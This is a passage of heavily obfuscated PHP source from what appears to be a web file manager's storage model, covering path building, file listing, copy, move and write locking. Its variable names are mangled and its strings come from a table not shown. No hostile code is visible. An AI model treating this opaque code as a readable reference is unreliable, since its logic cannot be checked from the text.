ŠÓ[530]]); foreach ($ÂÀ‰”º as $·ã¸ôÄ => $À±ª³åê) { if (isset($Ÿ§¿ØíÙ[$À±ª³åê])) { continue; } if ($·ã¸ôÄ == 0) { $Ÿ§¿ØíÙ[$À±ª³åê] = $this->_listAppendPathRoot($áÊ¥ÔŠ, $ÂÀ‰”º); } if ($·ã¸ôÄ != 0) { $ƒé³¸´°[] = $À±ª³åê; } } } unset($áÊ¥ÔŠ); $ƒé³¸´° = array_unique($ƒé³¸´°); if (count($ƒé³¸´°) > 0) { $Ö¼Öˆì½ = array($èæ¯ ŠÓ[426] => array($èæ¯ ŠÓ[427], $ƒé³¸´°)); if (count($ƒé³¸´°) == 1) { $À™µÙ = $this->sourceInfo($ƒé³¸´°[0]); $¤°¬Ëë = is_array($À™µÙ) ? array($À™µÙ) : !1; } else { $¤°¬Ëë = $this->field($èæ¯ ŠÓ[537])->where($Ö¼Öˆì½)->select(); } if (!$¤°¬Ëë) { $¤°¬Ëë = array(); } foreach ($¤°¬Ëë as $º ®‘İª) { $Ÿ§¿ØíÙ[$º ®‘İª[$èæ¯ ŠÓ[411]]] = $º ®‘İª[$èæ¯ ŠÓ[32]]; } } $Îé©ë ğ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ä­Ã‹ = array(); foreach ($„ÁßìÀ as &$áÊ¥ÔŠ) { $ñ“×ØÑ = $áÊ¥ÔŠ[$èæ¯ ŠÓ[530]]; $Á„Ë’Ó = $èæ¯ ŠÓ[12]; if (isset($ä­Ã‹[$ñ“×ØÑ])) { $Á„Ë’Ó = $ä­Ã‹[$ñ“×ØÑ]; } else { $ÂÀ‰”º = $this->parentLevelArray($áÊ¥ÔŠ[$èæ¯ ŠÓ[530]]); foreach ($ÂÀ‰”º as $·ã¸ôÄ => $À±ª³åê) { if (isset($Ÿ§¿ØíÙ[$À±ª³åê])) { $Á„Ë’Ó .= $Ÿ§¿ØíÙ[$À±ª³åê] . $èæ¯ ŠÓ[8]; } } $ä­Ã‹[$ñ“×ØÑ] = $Á„Ë’Ó; } $Á„Ë’Ó .= $áÊ¥ÔŠ[$èæ¯ ŠÓ[32]]; if ($áÊ¥ÔŠ[$èæ¯ ŠÓ[419]] == $èæ¯ ŠÓ[88]) { $Á„Ë’Ó .= $èæ¯ ŠÓ[8]; } $áÊ¥ÔŠ[$èæ¯ ŠÓ[528]] = str_replace($èæ¯ ŠÓ[538], $èæ¯ ŠÓ[8], $Á„Ë’Ó); if ($áÊ¥ÔŠ[$èæ¯ ŠÓ[441]] == $èæ¯ ŠÓ[197]) { $áÊ¥ÔŠ[$èæ¯ ŠÓ[32]] = trim($Ÿ§¿ØíÙ[$áÊ¥ÔŠ[$èæ¯ ŠÓ[411]]], $èæ¯ ŠÓ[8]); $áÊ¥ÔŠ[$èæ¯ ŠÓ[528]] = $áÊ¥ÔŠ[$èæ¯ ŠÓ[32]] . $èæ¯ ŠÓ[8]; } if (intval($áÊ¥ÔŠ[$èæ¯ ŠÓ[420]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($áÊ¥ÔŠ, $ÂÀ‰”º, $Îé©ë ğ); } } unset($áÊ¥ÔŠ); return $„ÁßìÀ; } private function _listAppendPathRecycle(&$¢‘…Ÿœ, $¼å´…Åã, $‰“ÏµĞİ) { $ÌşÅÇš“ =& $_SERVER[Ü©»’·]; if (!in_array($‰“ÏµĞİ, $¼å´…Åã) && $¢‘…Ÿœ[$ÌşÅÇš“[411]] != $‰“ÏµĞİ) { return; } $Ş©æÂ÷Ò = explode($ÌşÅÇš“[8], trim($¢‘…Ÿœ[$ÌşÅÇš“[528]], $ÌşÅÇš“[8])); $šÔÄİ¸å = implode($ÌşÅÇš“[8], array_slice($Ş©æÂ÷Ò, 2)); $¢‘…Ÿœ[$ÌşÅÇš“[528]] = $ÌşÅÇš“[8] . LNG($ÌşÅÇš“[539]) . $ÌşÅÇš“[8] . ltrim($šÔÄİ¸å, $ÌşÅÇš“[8]); $¢‘…Ÿœ[$ÌşÅÇš“[530]] = $ÌşÅÇš“[540] . implode($ÌşÅÇš“[50], array_slice($¼å´…Åã, 1)) . $ÌşÅÇš“[50]; if ($¢‘…Ÿœ[$ÌşÅÇš“[411]] == $‰“ÏµĞİ) { $¢‘…Ÿœ[$ÌşÅÇš“[530]] = $ÌşÅÇš“[540]; $¢‘…Ÿœ[$ÌşÅÇš“[441]] = $ÌşÅÇš“[197]; $¢‘…Ÿœ[$ÌşÅÇš“[32]] = LNG($ÌşÅÇš“[539]); } $¢‘…Ÿœ[$ÌşÅÇš“[541]] = $ÌşÅÇš“[542]; } protected function _listAppendPathRoot(&$ç­Éú¯, $¬À£…Ç) { $–Æá˜¸ =& $_SERVER[Ü©»’·]; static $…»”š´‘ = false; $Ş«¯É¡³ = $–Æá˜¸[12]; if ($ç­Éú¯[$–Æá˜¸[420]] == self::TYPE_USER) { if (defined($–Æá˜¸[484]) && $ç­Éú¯[$–Æá˜¸[514]] == USER_ID) { $Ş«¯É¡³ = LNG($–Æá˜¸[543]); if ($…»”š´‘ === !1) { $­ÑâÏĞ = Model($–Æá˜¸[544])->getInfoFull(USER_ID); $…»”š´‘ = _get($­ÑâÏĞ, $–Æá˜¸[545], $–Æá˜¸[12]); } if ($¬À£…Ç && $¬À£…Ç[0] == $…»”š´‘ || !$¬À£…Ç && $ç­Éú¯[$–Æá˜¸[411]] == $…»”š´‘) { $Ş«¯É¡³ = LNG($–Æá˜¸[546]); $ç­Éú¯[$–Æá˜¸[547]] = $–Æá˜¸[548]; } if (!$¬À£…Ç) { $ç­Éú¯[$–Æá˜¸[32]] = $Ş«¯É¡³; } } else { $ğŞò·¥ = Model($–Æá˜¸[522])->getInfoSimple($ç­Éú¯[$–Æá˜¸[514]]); $Ş«¯É¡³ = LNG($–Æá˜¸[549]) . $–Æá˜¸[162] . $ğŞò·¥[$–Æá˜¸[32]] . $–Æá˜¸[164]; $ç­Éú¯[$–Æá˜¸[550]] = array($–Æá˜¸[32] => $ğŞò·¥[$–Æá˜¸[32]], $–Æá˜¸[551] => $ğŞò·¥[$–Æá˜¸[551]], $–Æá˜¸[552] => $ğŞò·¥[$–Æá˜¸[552]]); } } else { if ($ç­Éú¯[$–Æá˜¸[420]] == self::TYPE_GROUP) { $ğŞò·¥ = Model($–Æá˜¸[531])->getInfoSimple($ç­Éú¯[$–Æá˜¸[514]]); $Ş«¯É¡³ = $ğŞò·¥[$–Æá˜¸[32]]; } else { if ($ç­Éú¯[$–Æá˜¸[420]] == self::TYPE_SYSTEM) { $Ş«¯É¡³ = $–Æá˜¸[553]; } } } $Ş«¯É¡³ = $Ş«¯É¡³ ? $–Æá˜¸[8] . $Ş«¯É¡³ . $–Æá˜¸[8] : $–Æá˜¸[8]; return $Ş«¯É¡³; } protected function _listAppendUser(&$òÀ÷‹Ší) { $û¼§•ú£ =& $_SERVER[Ü©»’·]; $©–Ö¿õ = array_to_keyvalue($òÀ÷‹Ší, $û¼§•ú£[12], $û¼§•ú£[463]); $šúÂüÏä = array_to_keyvalue($òÀ÷‹Ší, $û¼§•ú£[12], $û¼§•ú£[465]); $ĞÙÄ§²ú = array_merge($©–Ö¿õ, $šúÂüÏä); $ßÆíŸ† = Model($û¼§•ú£[544])->userListInfo($ĞÙÄ§²ú); foreach ($òÀ÷‹Ší as &$¼ù’Ü©ë) { $Î§æñîœ = $¼ù’Ü©ë[$û¼§•ú£[463]]; $¼ù’Ü©ë[$û¼§•ú£[463]] = $ßÆíŸ†[$Î§æñîœ] ? $ßÆíŸ†[$Î§æñîœ] : !1; $Î§æñîœ = $¼ù’Ü©ë[$û¼§•ú£[465]]; $¼ù’Ü©ë[$û¼§•ú£[465]] = $ßÆíŸ†[$Î§æñîœ] ? $ßÆíŸ†[$Î§æñîœ] : !1; if (isset($¼ù’Ü©ë[$û¼§•ú£[475]]) && $¼ù’Ü©ë[$û¼§•ú£[475]][$û¼§•ú£[554]]) { $úó¨™Íğ = $GLOBALS[$û¼§•ú£[6]][$û¼§•ú£[89]][$û¼§•ú£[555]]; if ($¼ù’Ü©ë[$û¼§•ú£[475]][$û¼§•ú£[556]] <= time() - $úó¨™Íğ) { $this->metaSet($¼ù’Ü©ë[$û¼§•ú£[411]], $û¼§•ú£[554], null); $this->metaSet($¼ù’Ü©ë[$û¼§•ú£[411]], $û¼§•ú£[556], null); unset($¼ù’Ü©ë[$û¼§•ú£[475]][$û¼§•ú£[554]]); continue; } $û”•ÎìŒ = $¼ù’Ü©ë[$û¼§•ú£[475]][$û¼§•ú£[554]]; $¼ù’Ü©ë[$û¼§•ú£[475]][$û¼§•ú£[557]] = Model($û¼§•ú£[544])->getInfoSimpleOuter($û”•ÎìŒ); } } unset($¼ù’Ü©ë); } public function parentLevelArray($÷ŠÃ¨ß) { $À¨ÀÂß‚ =& $_SERVER[Ü©»’·]; $÷ŠÃ¨ß = explode($À¨ÀÂß‚[50], trim($÷ŠÃ¨ß, $À¨ÀÂß‚[50])); return array_remove_value($÷ŠÃ¨ß, $À¨ÀÂß‚[197]); } public function listAll($¦üÓâÉ) { $· —ú¦Ë =& $_SERVER[Ü©»’·]; $®¬¿êÊŠ = $this->sourceInfo($¦üÓâÉ); $šÕ¨õÏ‚ = array($· —ú¦Ë[558] => array($· —ú¦Ë[559], $®¬¿êÊŠ[$· —ú¦Ë[530]] . $¦üÓâÉ . $· —ú¦Ë[560]), $· —ú¦Ë[561] => 0); $’ĞÅÒÆ¼ = $· —ú¦Ë[562]; $·®°¡Œ = "\x4c\x45\x46\x54\40\112\x4f\111\116\x20{$this->tablePrefix}\151\157\x5f\146\151\154\x65\x20\146\151\154\145\x20\157\156\40\163\x6f\x75\162\x63\145\56\146\x69\x6c\145\x49\104\x20\x3d\40\x66\x69\154\145\x2e\146\151\154\x65\111\104"; $ŠÒÓŸ“Å = $this->alias($· —ú¦Ë[455])->field($’ĞÅÒÆ¼)->where($šÕ¨õÏ‚)->join($·®°¡Œ)->select(); $this->_listAppendAuth($ŠÒÓŸ“Å); $this->_listAppendUser($ŠÒÓŸ“Å); $this->_listAppendPath($ŠÒÓŸ“Å); $ŠÒÓŸ“Å = array_to_keyvalue($ŠÒÓŸ“Å, $· —ú¦Ë[411]); $úú¢ÈÒº = "\57{$®¬¿êÊŠ[$· —ú¦Ë[32]]}\57"; $úú¢ÈÒº = $úú¢ÈÒº == $· —ú¦Ë[538] ? $· —ú¦Ë[8] : $úú¢ÈÒº; $ú†™Ëµ = array(); foreach ($ŠÒÓŸ“Å as $³™ö¿´™ => $°“¿•æÆ) { $î¹“«™  = $this->parentLevelArray($°“¿•æÆ[$· —ú¦Ë[530]]); array_shift($î¹“«™ ); $²‹’„ñ® = $úú¢ÈÒº; for ($ç›ûÚá³ = 0; $ç›ûÚá³ < count($î¹“«™ ); $ç›ûÚá³++) { $²‹’„ñ® .= $ŠÒÓŸ“Å[$î¹“«™ [$ç›ûÚá³]][$· —ú¦Ë[32]] . $· —ú¦Ë[8]; } $²‹’„ñ® .= $°“¿•æÆ[$· —ú¦Ë[32]]; if ($°“¿•æÆ[$· —ú¦Ë[419]]) { $²‹’„ñ® .= $· —ú¦Ë[8]; } $²‹’„ñ® = str_replace($· —ú¦Ë[538], $· —ú¦Ë[8], $²‹’„ñ®); $²‹’„ñ® = str_replace($· —ú¦Ë[538], $· —ú¦Ë[8], $²‹’„ñ®); $êÀ€öŸ™ = array($· —ú¦Ë[430] => str_replace($· —ú¦Ë[538], $· —ú¦Ë[8], $²‹’„ñ®), $· —ú¦Ë[563] => intval($°“¿•æÆ[$· —ú¦Ë[419]]), $· —ú¦Ë[86] => $this->pathInfoFilter($°“¿•æÆ)); if (!$°“¿•æÆ[$· —ú¦Ë[419]]) { $êÀ€öŸ™[$· —ú¦Ë[477]] = $°“¿•æÆ[$· —ú¦Ë[477]]; $êÀ€öŸ™[$· —ú¦Ë[87]] = $°“¿•æÆ[$· —ú¦Ë[84]]; } $ú†™Ëµ[] = $êÀ€öŸ™; } return $ú†™Ëµ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($šåæç¤›) { $º¶·â‹à =& $_SERVER[Ü©»’·]; if (!$this->allowLock()) { return; } $this->_lockCheck($º¶·â‹à[564], $šåæç¤›); $æßÙçõ = 1; $this->_lockEvent($šåæç¤›, array($º¶·â‹à[565], $º¶·â‹à[566]), $æßÙçõ); $this->_lockParent($šåæç¤›, array($º¶·â‹à[566]), $æßÙçõ); $this->_lockEvent($šåæç¤›, array($º¶·â‹à[567], $º¶·â‹à[568]), $æßÙçõ); $this->_lockCheckEnd($º¶·â‹à[564], $šåæç¤›); } public function lockCopyEnd($© ºŒœ) { $ÜÆÄ‹ö” =& $_SERVER[Ü©»’·]; if (!$this->allowLock()) { return; } $×é¸Ã¶ = 0; $this->_lockEvent($© ºŒœ, array($ÜÆÄ‹ö”[565], $ÜÆÄ‹ö”[566]), $×é¸Ã¶); $this->_lockParent($© ºŒœ, array($ÜÆÄ‹ö”[566]), $×é¸Ã¶); $this->_lockEvent($© ºŒœ, array($ÜÆÄ‹ö”[567], $ÜÆÄ‹ö”[568]), $×é¸Ã¶); } public function lockWriteStart($ÕÆÇŸæÔ, $ÏÉ°Ü°ˆ = '') { $× ûÔ€ı =& $_SERVER[Ü©»’·]; if (!$this->allowLock()) { return; } $this->_lockCheck($× ûÔ€ı[565], $ÕÆÇŸæÔ); $·òØ«–½ = 1; $this->_lockKey($× ûÔ€ı[569] . $ÕÆÇŸæÔ . $× ûÔ€ı[10] . $ÏÉ°Ü°ˆ, $·òØ«–½); $this->_lockEvent($ÕÆÇŸæÔ, array($× ûÔ€ı[564], $× ûÔ€ı[566]), $·òØ«–½); $this->_lockParent($ÕÆÇŸæÔ, array($× ûÔ€ı[564], $× ûÔ€ı[566]), $·òØ«–½); $this->_lockCheckEnd($× ûÔ€ı[565], $ÕÆÇŸæÔ); } public function lockWriteEnd($Ê¤×´ÅÎ, $ˆş¤»¢† = '') { $è÷çÑø­ =& $_SERVER[Ü©»’·]; if (!$this->allowLock()) { return; } $†£¿²´¬ = 0; $this->_lockKey($è÷çÑø­[569] . $Ê¤×´ÅÎ . $è÷çÑø­[10] . $ˆş¤»¢†, $†£¿²´¬); $this->_lockEvent($Ê¤×´ÅÎ, array($è÷çÑø­[564], $è÷çÑø­[566]), $†£¿²´¬); $this->_lockParent($Ê¤×´ÅÎ, array($è÷çÑø­[564], $è÷çÑø­[566]), $†£¿²´¬); } public function lockMoveStart($¬Ãİï›¬) { $¨³ˆ¼³À =& $_SERVER[Ü©»’·]; if (!$this->allowLock()) { return; } $this->_lockCheck($¨³ˆ¼³À[566], $¬Ãİï›¬); $æƒ³”âí = 1; $this->_lockKey($¨³ˆ¼³À[570] . $¬Ãİï›¬, $æƒ³”âí); $this->_lockEvent($¬Ãİï›¬, array($¨³ˆ¼³À[564], $¨³ˆ¼³À[565]), $æƒ³”âí); $this->_lockParent($¬Ãİï›¬, array($¨³ˆ¼³À[564], $¨³ˆ¼³À[566]), $æƒ³”âí); $this->_lockEvent($¬Ãİï›¬, array($¨³ˆ¼³À[571], $¨³ˆ¼³À[567], $¨³ˆ¼³À[568]), $æƒ³”âí); $this->_lockCheckEnd($¨³ˆ¼³À[566], $¬Ãİï›¬); } public function lockMoveEnd($ÛÎ°‚ ¬) { $ä½š­¥è =& $_SERVER[Ü©»’·]; if (!$this->allowLock()) { return; } $Ò×í¤‚É = 0; $this->_lockKey($ä½š­¥è[570] . $ÛÎ°‚ ¬, $Ò×í¤‚É); $this->_lockEvent($ÛÎ°‚ ¬, array($ä½š­¥è[564], $ä½š­¥è[565]), $Ò×í¤‚É); $this->_lockParent($ÛÎ°‚ ¬, array($ä½š­¥è[564], $ä½š­¥è[566]), $Ò×í¤‚É); $this->_lockEvent($ÛÎ°‚ ¬, array($ä½š­¥è[571], $ä½š­¥è[567], $ä½š­¥è[568]), $Ò×í¤‚É); } private function _lockCheck($·ºüñÊÙ, $òÔÀáÂÛ) { $ìÁ˜» =& $_SERVER[Ü©»’·]; $Õ´ˆµíï = $this->sourceInfo($òÔÀáÂÛ); $Ùä£ßşò = $·ºüñÊÙ . $ìÁ˜»[10] . $òÔÀáÂÛ; $this->_lockTimeStart[$Ùä£ßşò] = timeFloat(); if (!is_array($Õ´ˆµíï)) { return; } $æö¯»° = LNG($ìÁ˜»[572]); CacheLock::setErrorMsg($ìÁ˜»[162] . htmlspecialchars($Õ´ˆµíï[$ìÁ˜»[32]]) . $ìÁ˜»[164] . $æö¯»°); $this->_lockKey($Ùä£ßşò, 1); $this->_lockKey($Ùä£ßşò, 0); $ĞïÏ­ = array_reverse($this->parentLevelArray($Õ´ˆµíï[$ìÁ˜»[530]])); foreach ($ĞïÏ­ as $ã’¾Ü’ê) { $Ùä£ßşò = $·ºüñÊÙ . $ìÁ˜»[573] . $ã’¾Ü’ê; if (CacheLock::lockGet($ìÁ˜»[574] . $Ùä£ßşò)) { $Õ´ˆµíï = $this->sourceInfo($ã’¾Ü’ê); CacheLock::setErrorMsg($ìÁ˜»[162] . htmlspecialchars($Õ´ˆµíï[$ìÁ˜»[32]]) . $ìÁ˜»[164] . $æö¯»°); $this->_lockKey($Ùä£ßşò, 1); $this->_lockKey($Ùä£ßşò, 0); } } } private function _lockCheckEnd($Šõ“ºùó, $Œà…Ù®) { $Û³µ¹¦Ú =& $_SERVER[Ü©»’·]; $Ú›ŞÎÃª = $Šõ“ºùó . $Û³µ¹¦Ú[10] . $Œà…Ù®; CacheLock::setErrorMsg($Û³µ¹¦Ú[387]); if (!isset($this->_lockTimeStart[$Ú›ŞÎÃª])) { return; } $ÜÔ”¥ = timeFloat() - $this->_lockTimeStart[$Ú›ŞÎÃª]; unset($this->_lockTimeStart[$Ú›ŞÎÃª]); if ($ÜÔ”¥ > 0.5) { unset(self::$cacheSourceInfo[$Û³µ¹¦Ú[469] . $Œà…Ù®]); } $É¶ğÍË‘ = $this->sourceInfo($Œà…Ù®); if (!$É¶ğÍË‘) { show_json(LNG($Û³µ¹¦Ú[105]), !1); } } private function _lockParent($Ô³Êô, $ˆı¢ˆÆ, $‚»Á´¡) { if (!$this->autoLockSet) { return; } $ğ®•— = $this->sourceInfo($Ô³Êô); if (!is_array($ğ®•—)) { return; } $İÔå¤ˆÌ = array_reverse($this->parentLevelArray($ğ®•—[$_SERVER[Ü©»’·][530]])); foreach ($İÔå¤ˆÌ as $Á«€´Ë“) { $this->_lockEvent($Á«€´Ë“, $ˆı¢ˆÆ, $‚»Á´¡); } } private function _lockEvent($…­úğÃ˜, $ÓŸšÍ£’, $ È‚äó¤) { $—½Ôé½Â =& $_SERVER[Ü©»’·]; if (!$this->autoLockSet) { return; } foreach ($ÓŸšÍ£’ as $¥ÄÛ¥Üê) { $¤‘Äµµ— = $¥ÄÛ¥Üê . $—½Ôé½Â[10] . $…­úğÃ˜; if ($ È‚äó¤ && CacheLock::lockGet($—½Ôé½Â[574] . $¤‘Äµµ—)) { continue; } $this->_lockKey($¤‘Äµµ—, $ È‚äó¤); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($¿ÚîéÆÚ, $™Ãö’¢ = 1) { $Ÿö™ÍÑì = $_SERVER[Ü©»’·][574] . md5($¿ÚîéÆÚ); if ($™Ãö’¢) { if (isset(self::$_lockItemArr[$Ÿö™ÍÑì])) { return; } self::$_lockItemArr[$Ÿö™ÍÑì] = 1; CacheLock::lock($Ÿö™ÍÑì, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$Ÿö™ÍÑì])) { return; } unset(self::$_lockItemArr[$Ÿö™ÍÑì]); CacheLock::unlock($Ÿö™ÍÑì); } } public function isParentOf($•ö“«Ö, $ÊèÕÃ…Ï) { $Ü€ì£…ë =& $_SERVER[Ü©»’·]; $²Šà‹Û• = $this->sourceInfo($•ö“«Ö); $± È«‹ = $this->sourceInfo($ÊèÕÃ…Ï); $Œò­Õñé = $²Šà‹Û•[$Ü€ì£…ë[530]] . $²Šà‹Û•[$Ü€ì£…ë[411]] . $Ü€ì£…ë[50]; $öñ˜Ÿä = $± È«‹[$Ü€ì£…ë[530]] . $± È«‹[$Ü€ì£…ë[411]] . $Ü€ì£…ë[50]; $İ©»¯– = strpos($öñ˜Ÿä, $Œò­Õñé) === 0; return $İ©»¯–; } private $targetIsDelete = 0; public function copy($¼İÑŸ½É, $’æ¦ŞÂ®, $Ì¾ø… ä = REPEAT_REPLACE, $öØ·Â = '') { $ÅàÎƒîÆ =& $_SERVER[Ü©»’·]; $ŒöÉîª¡ = $this->sourceInfo($¼İÑŸ½É); $â˜ñèì” = $this->sourceInfo($’æ¦ŞÂ®); if (!$ŒöÉîª¡ || !$â˜ñèì” || $â˜ñèì”[$ÅàÎƒîÆ[419]] != $ÅàÎƒîÆ[88]) { return !1; } if ($this->isParentOf($¼İÑŸ½É, $’æ¦ŞÂ®)) { return !1; } $©¥Ó»”† = $öØ·Â ? $öØ·Â : $ŒöÉîª¡[$ÅàÎƒîÆ[32]]; $this->lockCopyStart($¼İÑŸ½É); $this->lockWriteStart($’æ¦ŞÂ®, $©¥Ó»”†); $ÈÓŠ‚ª = array($ÅàÎƒîÆ[575] => array(), $ÅàÎƒîÆ[576] => array(), $ÅàÎƒîÆ[577] => array()); $this->targetIsDelete = intval($ŒöÉîª¡[$ÅàÎƒîÆ[440]]); $åš¨¹¶ = $this->fileNameExistCache($’æ¦ŞÂ®, $ŒöÉîª¡[$ÅàÎƒîÆ[32]]); $õíı¦Æ = $this->_copy($¼İÑŸ½É, $’æ¦ŞÂ®, $Ì¾ø… ä, $ÈÓŠ‚ª, !0, $öØ·Â); $this->_childrenListClear(); $this->lockCopyEnd($¼İÑŸ½É); $this->lockWriteEnd($’æ¦ŞÂ®, $©¥Ó»”†); if ($ŒöÉîª¡[$ÅàÎƒîÆ[419]] == $ÅàÎƒîÆ[88] && $åš¨¹¶ == $õíı¦Æ) { $this->folderSizeResetChildren($åš¨¹¶); } Model($ÅàÎƒîÆ[578])->addAll($ÈÓŠ‚ª[$ÅàÎƒîÆ[576]], array(), !0); if ($åš¨¹¶ != $õíı¦Æ || $ŒöÉîª¡[$ÅàÎƒîÆ[419]] == $ÅàÎƒîÆ[88]) { Model($ÅàÎƒîÆ[579])->eventCopy($õíı¦Æ); } $this->saveAll($ÈÓŠ‚ª[$ÅàÎƒîÆ[577]]); Model($ÅàÎƒîÆ[199])->linkAdd($ÈÓŠ‚ª[$ÅàÎƒîÆ[575]]); $this->folderSizeReset($’æ¦ŞÂ®); $this->updateModifyTime($’æ¦ŞÂ®); return $õíı¦Æ; } private function _copy($Ë¡İ¾„Â, $©€¦úØ, $ì‚é¤ï, &$ŒÅ½ŞÓ, $ÇÑÅÀ¨Á, $Á¨Ö¯ô = '') { $ûØÚ« ¡ =& $_SERVER[Ü©»’·]; $Ï¸ëÎ“ = $this->sourceInfoCache($Ë¡İ¾„Â); $¥ì—µ¿÷ = $Ï¸ëÎ“[$ûØÚ« ¡[419]] == $ûØÚ« ¡[88]; $…ÄÇ©ãÙ = $Á¨Ö¯ô ? $Á¨Ö¯ô : $Ï¸ëÎ“[$ûØÚ« ¡[32]]; $±–ãê§ = $this->fileNameExistCache($©€¦úØ, $…ÄÇ©ãÙ); if ($ÇÑÅÀ¨Á) { $this->_childrenAllMake($Ë¡İ¾„Â); if ($¥ì—µ¿÷ && $±–ãê§) { $this->_childrenAllMake($±–ãê§); } } if (!$±–ãê§) { return $this->_copyCreate($Ë¡İ¾„Â, $©€¦úØ, $…ÄÇ©ãÙ, $ŒÅ½ŞÓ); } $óÄµ€ÔÜ = $±–ãê§; if ($¥ì—µ¿÷) { if ($ì‚é¤ï == REPEAT_RENAME_FOLDER) { $…ÄÇ©ãÙ = $this->fileNameAutoCache($©€¦úØ, $…ÄÇ©ãÙ, $ì‚é¤ï, $¥ì—µ¿÷); $óÄµ€ÔÜ = $this->_copyCreate($Ë¡İ¾„Â, $©€¦úØ, $…ÄÇ©ãÙ, $ŒÅ½ŞÓ); } else { $ªÚìàŠï = $this->_childrenList($Ë¡İ¾„Â); foreach ($ªÚìàŠï as $µ‹ùçşó) { $this->_copy($µ‹ùçşó[$ûØÚ« ¡[411]], $±–ãê§, $ì‚é¤ï, $ŒÅ½ŞÓ, !1); } } } else { if ($ì‚é¤ï == REPEAT_RENAME || $ì‚é¤ï == REPEAT_RENAME_FOLDER) { $…ÄÇ©ãÙ = $this->fileNameAutoCache($©€¦úØ, $…ÄÇ©ãÙ, $ì‚é¤ï, $¥ì—µ¿÷); $óÄµ€ÔÜ = $this->_copyCreate($Ë¡İ¾„Â, $©€¦úØ, $…ÄÇ©ãÙ, $ŒÅ½ŞÓ); } else { if ($ì‚é¤ï == REPEAT_REPLACE) { $åÈø‰Î« = $this->sourceInfoCache($±–ãê§); $»Åğâ± = $this->fileHistory($åÈø‰Î«, $Ï¸ëÎ“[$ûØÚ« ¡[477]], $Ï¸ëÎ“[$ûØÚ« ¡[76]]); if ($»Åğâ±) { $ŒÅ½ŞÓ[$ûØÚ« ¡[575]][] = $Ï¸ëÎ“[$ûØÚ« ¡[477]]; } } else { if ($ì‚é¤ï == REPEAT_SKIP) { } } } Hook::trigger($ûØÚ« ¡[580], array($ûØÚ« ¡[581], $Ï¸ëÎ“, 0)); } return $óÄµ€ÔÜ; } private function _copyCreate($Ò½ŠÇñí, $—ûÛ¸±, $ùò˜şúº, &$àÃ»›Ú÷) { $®“½ñã =& $_SERVER[Ü©»’·]; $İÇœ¬ÈÄ = $this->sourceInfoCache($Ò½ŠÇñí); $’ú¥ŠŠ¹ = $this->sourceInfoCache($—ûÛ¸±); $¡òÆ»ê = $this->_makeItemData($İÇœ¬ÈÄ, $’ú¥ŠŠ¹, $ùò˜şúº); Hook::trigger($®“½ñã[582], $¡òÆ»ê); Hook::trigger($®“½ñã[583], array($®“½ñã[584], $¡òÆ»ê, 0)); $ş¡ˆ”Å = $this->add($¡òÆ»ê); $àËõ¬˜Ÿ = array($®“½ñã[411] => $ş¡ˆ”Å, $®“½ñã[32] => $ùò˜şúº); $this->_copyApplyMeta($àËõ¬˜Ÿ, $àÃ»›Ú÷); if ($İÇœ¬ÈÄ[$®“½ñã[419]] != $®“½ñã[88]) { $àÃ»›Ú÷[$®“½ñã[575]][] = $İÇœ¬ÈÄ[$®“½ñã[477]]; return $ş¡ˆ”Å; } $€ââ ŸÌ = array(); $Õô·îµŞ = array(); $this->_childrenListAll($Ò½ŠÇñí, $€ââ ŸÌ); $¢ˆÉ…ûÀ = count($€ââ ŸÌ); if ($¢ˆÉ…ûÀ == 0) { return $ş¡ˆ”Å; } $”ÉŞô‰ = $this->sourceInfo($ş¡ˆ”Å); foreach ($€ââ ŸÌ as $£ËÙöº¦) { $¿ùıêøÏ = $this->_makeItemData($£ËÙöº¦, $”ÉŞô‰, $£ËÙöº¦[$®“½ñã[32]]); $¿ùıêøÏ[$®“½ñã[530]] = $£ËÙöº¦[$®“½ñã[530]]; $Õô·îµŞ[] = $¿ùıêøÏ; } $this->chunkEventSet($®“½ñã[585], array($®“½ñã[586], $¡òÆ»ê, $¢ˆÉ…ûÀ)); $this->addAll($Õô·îµŞ, array(), !1); $¿Ç†Ü‚ï = $this->where(array($®“½ñã[441] => $ş¡ˆ”Å))->select(); $—Îâ®øÜ = $this->_childrenMakeRelation($€ââ ŸÌ, $¿Ç†Ü‚ï); $—Îâ®øÜ[$Ò½ŠÇñí] = $ş¡ˆ”Å; $¡ÃûóÀß = array(); $Ü£—’À = array(); foreach ($¿Ç†Ü‚ï as $£ËÙöº¦) { $©¤ƒµõ× = $£ËÙöº¦[$®“½ñã[411]]; $òÑúµ°“ = $this->_childrenMatch($—Îâ®øÜ, $£ËÙöº¦, $”ÉŞô‰); $¡ÃûóÀß[] = array($®“½ñã[411], $©¤ƒµõ×, $®“½ñã[441], $òÑúµ°“[$®“½ñã[441]]); $Ü£—’À[] = array($®“½ñã[411], $©¤ƒµõ×, $®“½ñã[530], $òÑúµ°“[$®“½ñã[530]]); $this->_copyApplyMeta($£ËÙöº¦, $àÃ»›Ú÷); if ($£ËÙöº¦[$®“½ñã[419]] != $®“½ñã[88]) { $àÃ»›Ú÷[$®“½ñã[575]][] = $£ËÙöº¦[$®“½ñã[477]]; } } $this->chunkEventSet($®“½ñã[587], array($®“½ñã[588], $¡òÆ»ê, $¢ˆÉ…ûÀ)); $this->saveAll($¡ÃûóÀß); $this->chunkEventSet($®“½ñã[589], array($®“½ñã[590], $¡òÆ»ê, $¢ˆÉ…ûÀ)); $this->saveAll($Ü£—’À); return $ş¡ˆ”Å; } private function _childrenMakeRelation($îŞ©Æıı, $’÷ŸÁèÚ) { $§£°ÉÒ† =& $_SERVER[Ü©»’·]; $º·ºÁ” = array(); $ã†ÍÕ§¬ = array(); foreach ($îŞ©Æıı as $·Í±ñ») { $ÌÊİÍûÛ = $·Í±ñ»[$§£°ÉÒ†[32]] . $§£°ÉÒ†[8] . $·Í±ñ»[$§£°ÉÒ†[530]]; $º·ºÁ”[$ÌÊİÍûÛ] = $·Í±ñ»[$§£°ÉÒ†[411]]; } foreach ($’÷ŸÁèÚ as $·Í±ñ») { $ÌÊİÍûÛ = $·Í±ñ»[$§£°ÉÒ†[32]] . $§£°ÉÒ†[8] . $·Í±ñ»[$§£°ÉÒ†[530]]; $œ¹ªªé = $º·ºÁ”[$ÌÊİÍûÛ]; $ã†ÍÕ§¬[$œ¹ªªé] = $·Í±ñ»[$§£°ÉÒ†[411]]; } return $ã†ÍÕ§¬; } private function _childrenMatch($Æ„æ÷Ş, $úúˆÈù°, 